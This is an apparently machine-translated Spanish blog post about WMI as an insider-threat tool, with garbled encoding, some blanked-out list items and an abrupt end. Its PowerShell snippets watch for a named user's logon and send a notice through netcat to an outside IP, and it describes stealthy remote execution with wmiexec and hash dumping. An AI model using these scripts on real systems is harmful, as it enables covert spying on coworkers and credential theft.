<!doctype html>
<html class="no-js" lang="es">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëà üë¨ üöæ Gu√≠a de instrumentaci√≥n de administraci√≥n de Windows (WMI): comprensi√≥n de los ataques de WMI üëë üñïüèº üå≥</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Windows Management Instrumentation (WMI) es un subsistema de PowerShell que brinda a los administradores acceso a potentes herramientas de monitoreo d...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Gu√≠a de instrumentaci√≥n de administraci√≥n de Windows (WMI): comprensi√≥n de los ataques de WMI</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/507068/"><img src="https://habrastorage.org/webt/wm/nj/qv/wmnjqvqbgcfcfxcp3omsbeuk4xi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Windows Management Instrumentation (WMI) es un subsistema de PowerShell que brinda a los administradores acceso a potentes herramientas de monitoreo del sistema. Este kit de herramientas se concibi√≥ como una herramienta de administraci√≥n del sistema r√°pida y efectiva, pero no todos la usan con buenos prop√≥sitos: con su ayuda, los expertos pueden espiar a otros empleados. Conocer esta vulnerabilidad de WMI hace que sea m√°s f√°cil detectar y combatir las amenazas internas. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En este art√≠culo, examinaremos qu√© son las herramientas WMI, por qu√© son necesarias y c√≥mo se pueden utilizar para rastrear la actividad interna en el sistema. Tambi√©n hemos compilado una gu√≠a m√°s detallada sobre eventos WMI y espionaje interno, que puede </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">descargar de forma gratuita.</font></font></a><br>
<a name="habracut"></a><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Breve rese√±a: ¬øqu√© es WMI y para qu√© sirve?</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/0t/au/hp/0tauhpqfa_9fk8xebbdasj4e3je.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Damos un ejemplo concreto. </font><font style="vertical-align: inherit;">Con WMI, puede solicitar, por ejemplo, todos los archivos grandes de Excel ubicados en un directorio particular y luego recibir una notificaci√≥n cada vez que cree un archivo con un tama√±o determinado, por ejemplo 1 MB. </font><font style="vertical-align: inherit;">El </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet Register-WmiEvent le</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> permite hacer todo esto con una sola l√≠nea no demasiado complicada en PowerShell. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En buenas manos, WMI puede servir para muchos prop√≥sitos, pero de la misma manera, puede convertirse en una herramienta de actividad interna maliciosa. </font><font style="vertical-align: inherit;">Puedes imaginar f√°cilmente c√≥mo una persona con los h√°bitos de Edward Snowden usa WMI para espiar a sus colegas. </font><font style="vertical-align: inherit;">Para hacer esto, ni siquiera necesita conocimientos t√©cnicos especiales.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Supongamos que nuestro hipot√©tico informante "accidentalmente" descubri√≥ que su colega Lex descarga peri√≥dicamente grandes archivos de Excel que contienen n√∫meros de seguridad social y otros datos personales de los clientes. </font><font style="vertical-align: inherit;">En este caso, nuestra informaci√≥n privilegiada discreta puede construir algo como esto:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WmiEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance isa 'CIM_DataFile' and TargetInstance.FileSize &gt; 2000000 and TargetInstance.Path = '\\Users\\lex\\Important' and targetInstance.Drive = 'C:‚Äô and targetInstance.Extension =‚Äôxlsx‚Äô‚Äù -Action $action </code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Este c√≥digo consulta el objeto </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CIM_DataFile</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> para acceder a informaci√≥n sobre la creaci√≥n del archivo Excel en el directorio especificado, y luego comienza la ejecuci√≥n del bloque de script. </font><font style="vertical-align: inherit;">Hacia el final de este art√≠culo, analizaremos m√°s de cerca c√≥mo podr√≠a ser este bloque de escenarios en el caso de nuestra hipot√©tica informaci√≥n privilegiada.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">¬øPara qu√© se utiliza el Kit de herramientas de administraci√≥n de Windows?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Antes de pasar a explorar c√≥mo WMI puede ser utilizado por personas de adentro para fines de seguimiento, vale la pena se√±alar que tiene muchos usos leg√≠timos. </font><font style="vertical-align: inherit;">El prop√≥sito global de este sistema es reunir todos los controles para dispositivos y aplicaciones en redes corporativas. </font><font style="vertical-align: inherit;">Por lo tanto, WMI se puede usar:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> para recopilar informaci√≥n sobre el estado de los sistemas inform√°ticos locales y remotos </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">configuraciones de seguridad para computadoras y aplicaciones remotas</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">configuraci√≥n y edici√≥n de propiedades del sistema</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">establecer y editar permisos para usuarios y grupos autorizados</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ejecuci√≥n de c√≥digo y serializaci√≥n de objetos (una </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">especie de "SSH con esteroides"</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">asignar y editar etiquetas de unidad</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">creando un horario de proceso</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">repositorios de objetos de respaldo</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">habilitar y deshabilitar el registro de errores</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se puede acceder a todas estas caracter√≠sticas utilizando PowerShell y WMIC, la interfaz de l√≠nea de comandos de WMI. </font><font style="vertical-align: inherit;">Como puede ver, WMI tiene una amplia variedad de aplicaciones, y este sistema le permite rastrear y editar muchos par√°metros diferentes en una red de computadoras.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Arquitectura de instrumentaci√≥n de administraci√≥n de Windows</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/2w/tf/ij/2wtfijgpvxpx9nijaapuk9a74gg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El kit de herramientas de WMI es parte del sistema operativo Windows y est√° preinstalado en todos los sistemas operativos a partir de Windows 2000. WMI consta de los siguientes componentes:</font></font><br>
<br>
<ul>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">El servicio WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> es una implementaci√≥n del sistema WMI en Windows. </font><font style="vertical-align: inherit;">Este proceso aparece bajo el nombre de "Instrumental de administraci√≥n de Windows" y es el enlace entre los proveedores de WMI, el repositorio de WMI y las aplicaciones de administraci√≥n. </font><font style="vertical-align: inherit;">Este proceso comienza autom√°ticamente cuando enciende la computadora.</font></font></li>
<li><strong> </strong> ‚Äî        ,      WMI.        ,  WMI        ,       Windows,    .</li>
<li><strong> WMI </strong> ‚Äî  ,       .      WMI   ,      .        Windows.</li>
<li><strong> </strong>  WMI     WMI.      ,     .   WMI       .</li>
<li><strong></strong>,     ,         . ,           .              .</li>
<li><strong> WMI</strong> ‚Äî   ,      ,   WMI.      .         WMI.</li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">El administrador de objetos CMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> es un sistema que se encuentra entre la aplicaci√≥n de administraci√≥n y los proveedores de WMI. </font><font style="vertical-align: inherit;">Ella solicita datos de estos proveedores y luego los transfiere a la aplicaci√≥n.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">La API de WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> realiza estas operaciones y proporciona a las aplicaciones acceso a la infraestructura de WMI sin depender del tipo de dispositivo utilizado.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Un consumidor de WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> es una entidad que env√≠a solicitudes a objetos a trav√©s del administrador de objetos. </font><font style="vertical-align: inherit;">Por lo general, un consumidor de WMI es una aplicaci√≥n de monitoreo, como PRTG Network Monitor, que ejecuta la aplicaci√≥n o un script de PowerShell.</font></font></li>
</ul><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hacer solicitudes de WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La forma m√°s f√°cil de ejecutar una solicitud WMI es ejecutar WMIC en una l√≠nea de comandos est√°ndar de Windows. </font><font style="vertical-align: inherit;">Siga estos pasos para obtener informaci√≥n sobre el procesador utilizado en la computadora local:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Abrir s√≠mbolo del sistema</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Escriba WMIC para invocar el programa y presione Entrar </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Aparecer√° la ventana del s√≠mbolo del sistema WMIC.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">En el s√≠mbolo del sistema, puede ejecutar solicitudes WMI. </font><font style="vertical-align: inherit;">La solicitud m√°s simple es ver informaci√≥n sobre el procesador local, que se puede realizar con el siguiente comando:</font></font><br>
<pre><code class="plaintext hljs">WMIC CPU</code></pre><br>
</li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Los resultados se mostrar√°n en la l√≠nea de comando.</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Casi todos los comandos que se analizar√°n a continuaci√≥n se ejecutan de esta manera. </font><font style="vertical-align: inherit;">Sin embargo, WMI le permite recibir informaci√≥n mucho m√°s detallada que la informaci√≥n del procesador, incluso de computadoras y aplicaciones remotas.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Taller sobre el uso de eventos WMI para monitorear un sistema</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En esta secci√≥n, veremos c√≥mo usar WMI para ejecutar comandos y monitorear procesos en computadoras remotas. </font><font style="vertical-align: inherit;">Dichas t√©cnicas se pueden usar como parte </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">del sistema de an√°lisis de comportamiento de usuarios y entidades (UEBA)</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> para monitorear autom√°ticamente los procesos en todo el sistema y </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">verificar si hay amenazas internas</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , que se evidencian por comportamiento sospechoso o eventos anormales.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Uso de la funcionalidad wmiexec de Impacket</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En WMI, puede realizar varias funciones adem√°s de la gesti√≥n de eventos. En √©l, puede iniciar procesos y ejecutar comandos en ventanas de Windows en computadoras locales y remotas. Por diversi√≥n, intente ingresar al </font><font style="vertical-align: inherit;">comando </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> process call create 'notepad.exe' en una sesi√≥n de PowerShell para abrir el antiguo editor de texto de Microsoft. Utiliza la maravillosa herramienta de l√≠nea de comandos wmic incluida con WMI. Genial, verdad? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si agregu√© la opci√≥n / Nodo: y luego el nombre de la computadora remota de Windows, podr√≠a ejecutar el Bloc de notas en √©l, siempre que tenga los permisos adecuados. Est√° claro que, a nivel pr√°ctico, wmic es una herramienta indispensable para los administradores de sistemas.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Antes de comenzar a resentir: s√© que hay </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlets de PowerShell</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> equivalentes </font><font style="vertical-align: inherit;">. Sin embargo, encuentro que la sintaxis wmic es m√°s f√°cil de recordar. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ser√≠a genial si pudiera usar WMI para crear un pseudo shell simple e invisible.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/gu/nl/1j/gunl1jzoplcyeo2axlgjwd6bifw.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Un pseudo shell oculto creado con wmiexec. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para mi suerte, esto se puede hacer en Impacket. En el entorno de prueba de Amazon, utilic√© mi </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmiexec</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> favorito </font><font style="vertical-align: inherit;">para acceder a WMI a trav√©s de la m√°quina virtual Linux. Wmiexec proporciona la capacidad de crear un pseudo shell: cada vez que se ingresa un comando en el lado del cliente, se crea un shell separado en la computadora de destino para ejecutar este comando. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tanto psexec como smbexec usan los servicios de Windows para ejecutar comandos en un sistema remoto. Smbexec se ejecuta silenciosamente, ya que r√°pidamente crea y luego elimina el servicio, y psexec, por el contrario, lo deja a la vista.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/vk/mb/ik/vkmbiktrjf4cn49ihyxvhp12u0w.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 La herramienta wmiexec ejecuta directamente cmd.exe para ejecutar el comando de forma remota. </font><font style="vertical-align: inherit;">El comando creado se puede encontrar en el visor de eventos. </font><font style="vertical-align: inherit;">Tenga en cuenta que hemos evitado los servicios de Windows que llaman la atenci√≥n. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La herramienta wmiexec no afecta en absoluto a los servicios, sino que utiliza las funciones de WMI descritas anteriormente para iniciar el proceso directamente. </font><font style="vertical-align: inherit;">Al buscar posibles fuentes de amenazas, los expertos en seguridad rara vez comienzan con WMI, mientras que los servicios suelen ser un buen lugar para comenzar a buscar evidencia de un ataque. </font><font style="vertical-align: inherit;">Buen movimiento, wmiexec!</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Uso de eventos WMI para monitorear usuarios</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mientras me divert√≠a con la idea de que era tan inteligente y experimentaba con WMI, result√≥ que los muchachos involucrados en las pruebas de penetraci√≥n hab√≠an entendido por mucho tiempo c√≥mo funcionaba todo. Definitivamente necesita leer </font><font style="vertical-align: inherit;">la </font><font style="vertical-align: inherit;">sorprendente </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">presentaci√≥n</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> de Matt Graeber de la conferencia Black Hat 2015, donde habla sobre c√≥mo los atacantes pueden convertir WMI y todo su arsenal de eventos en una herramienta de pirater√≠a. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En mi historia, me imagino a una persona con informaci√≥n privilegiada a la Snowden que tiene algunos conocimientos t√©cnicos, pero que no es un experto en pirater√≠a profunda, y en quien conf√≠an otros empleados. Esta persona no necesita saber todo sobre WMI. Necesita saber solo lo que se requiere para trabajar en una computadora remota y desencadenar eventos.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Adem√°s de los objetos de archivo, hay otra clase interesante de objetos que se pueden aprender usando WMI, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">win32_LogOnSession</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Consultar este objeto b√°sico de Windows le permite encontrar los usuarios que est√°n actualmente en el sistema. Luego puede usar el bloque de script de acci√≥n Register-WmiEvent para ejecutar el script de PowerShell cuando un nuevo usuario inicia sesi√≥n de forma remota. ¬øEntendido? Un atacante puede recibir notificaciones cada vez que un usuario que supervisa inicia sesi√≥n en el sistema de destino. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esto es lo que bosquej√©:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" ‚ÄìAction $action</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La siguiente pregunta es c√≥mo programar la ejecuci√≥n de un bloque de script. Un misterioso informante de mis fantas√≠as est√° interesado en un usuario espec√≠fico: Cruell. Nuestro villano estaba espiando lentamente a Cruella y ahora planea usar la informaci√≥n recopilada para descifrar su cuenta de trabajo. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La tarea del bloque de script es verificar qui√©n inici√≥ sesi√≥n y determinar si fue Cruella. Escrib√≠ algunas l√≠neas de c√≥digo de PowerShell para este prop√≥sito, pero claramente esta no es la mejor manera. No uso la informaci√≥n del evento transmitida al bloque de script, es decir, la informaci√≥n sobre el nuevo usuario. Me encuentro con obst√°culos, las razones por las que no puedo entender en este momento. Esto requiere m√°s conocimiento t√©cnico que el que nuestro hipot√©tico conocedor tiene o est√° dispuesto a adquirir.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En cambio, simplemente revis√© la lista de usuarios devueltos por gwmi Win32_Process (intente ejecutar este cmdlet en una sesi√≥n de PowerShell) y los compar√© con el par√°metro Cruell. </font><font style="vertical-align: inherit;">Puedes admirar mi decisi√≥n final:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {<font></font>
<font></font>
$names=gwmi Win32_Process|% { $_.GetOwner().User}<font></font>
foreach ($user in $names){<font></font>
<font></font>
    if ($user -eq "cruella") {<font></font>
<font></font>
        echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80<font></font>
    }<font></font>
}<font></font>
<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Register-WmiEvent le permite mantener el sigilo, ya que solo comienza cuando inicia sesi√≥n nuevamente, en lugar de solicitar regularmente el objeto Win32_Process, que puede ser bastante notable. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Recuerde que nuestra informaci√≥n privilegiada trata de no llamar la atenci√≥n. </font><font style="vertical-align: inherit;">Ella tiene acceso al sistema remoto a trav√©s de psexec, smbexec o wmiexec (la forma m√°s discreta). </font><font style="vertical-align: inherit;">Sin embargo, no necesita deambular constantemente de un lado a otro por el sistema de la v√≠ctima. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esta es la belleza de usar eventos WMI. </font><font style="vertical-align: inherit;">Puede esperar la notificaci√≥n de Register-WmiEvent y luego hacer su movimiento con calma.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Integraci√≥n de Netcat y WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pero, ¬øc√≥mo trae el gui√≥n la noticia de que Cruella ha iniciado sesi√≥n en la computadora de destino? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si notas que utilic√© los comandos de Netcat anteriores, puedes darte un plus. </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> es una utilidad conocida y universal que le permite establecer conexiones (opcional para malware). Con √©l, puede realizar una conexi√≥n inversa o simplemente enviar mensajes a trav√©s de la red. Aprovech√© esta segunda oportunidad. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El script anterior env√≠a un mensaje de Netcat en modo de espera y muestra "Cruella ha iniciado sesi√≥n". Misi√≥n cumplida. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Puedes imaginar c√≥mo nuestro estafador luego arroja hash con la </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">herramienta Secretsdump Impacket</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, descifre el hash de credenciales de Cruella, luego inicie wmiexec, utilizando los permisos de Cruella, para buscar datos m√°s valiosos.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ca/en/ni/caennizhyw6u4_yuldedujkbowa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 El c√≥digo Register-WmiEvent se puede ejecutar directamente. </font><font style="vertical-align: inherit;">Presta atenci√≥n al identificador de evento que se muestra</font></font><br>
 <br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Soluci√≥n de problemas de supervisi√≥n de WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como parte de este ejemplo, quer√≠a ejecutar de forma remota (usando wmiexec) un programa √∫til que me alertar√≠a cuando un usuario en particular, es decir, Cruella, inicie sesi√≥n. Despu√©s de eso, pude restablecer y descifrar sus credenciales de forma segura. Esta ser√≠a la forma m√°s discreta: acceso remoto y sin archivos. Al principio me pareci√≥ que el √∫nico problema era la naturaleza temporal de los eventos de WMI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Por lo tanto, necesitaba encerrar mi largo y obsceno Register-WMIEvent (a continuaci√≥n) en la l√≠nea de comandos de PowerShell con el par√°metro ‚Äìnoexit, lo que garantiza que la sesi√≥n de PowerShell se guarde despu√©s de Register-Event y, por lo tanto, el evento se guarda.</font></font><br>
<br>
<pre><code class="plaintext hljs"> Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {$names=gwmi Win32_Process|% { $_.GetOwner().User};foreach ($user in $names){if ($user -eq "cruella") {echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80}}}
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cuando comenc√© a trabajar en esto, me di cuenta de que ten√≠a que "convertir" caracteres especiales como $, "y |, y pasarlos como literales directamente a PowerShell. </font><font style="vertical-align: inherit;">Otro dolor de cabeza: termin√© teniendo que abandonar el uso de l√≠neas verticales porque causaban errores de an√°lisis. </font><font style="vertical-align: inherit;">No preguntes. </font><font style="vertical-align: inherit;">Poco a poco, llegu√© a esta larga l√≠nea de c√≥digo:</font></font><br>
<br>
<pre><code class="plaintext hljs">$command="powershell -noexit -C Register-WMIEvent -Query ""Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3"" -Action {`$names = gwmi Win32_Process; `$users=@(); foreach (`$n in `$names) {`$users += `$n.GetOwner().User}; foreach (`$u in `$users) {if (`$u -eq ""cruella"") {.\wmiexec C:\Users\lex\Documents\nc.exe 172.31.18.92 80 }}}<font></font>
.\wmiexec.exe corp.acme/lex@172.31.46.115 "$command"<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Parec√≠a prometedor y parec√≠a funcionar correctamente de acuerdo con el registro de eventos de Windows en el sistema de destino. </font><font style="vertical-align: inherit;">Sin embargo, al mirar m√°s de cerca, me di cuenta de que no funciona. </font><font style="vertical-align: inherit;">Estoy seguro de que al final podr√≠a llevarlo a la forma correcta, pero para esto necesitar√≠a tiempo y caf√©, mucho caf√©. </font><font style="vertical-align: inherit;">Hay otra opci√≥n, un poco menos discreta y en absoluto sin archivos: puede usar smbclient para transferir el script y luego ejecutarlo directamente en la computadora de destino.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/qo/vq/jc/qovqjcy0lqzkf5v3bvaxglub5eu.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Ejecutar remotamente el complejo cmdlet Register-Event me pareci√≥ absolutamente correcto. </font><font style="vertical-align: inherit;">Pero no funcion√≥. </font><font style="vertical-align: inherit;">Bueno, por </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
desgracia, en esta etapa, mis suposiciones de que una persona inteligente, pero no demasiado experimentada, podr√≠a usar f√°cilmente los eventos temporales de WMI para la vigilancia encubierta comenzaron a desmoronarse.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">¬øPor qu√© deben usarse los eventos constantes para la observaci√≥n? </font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
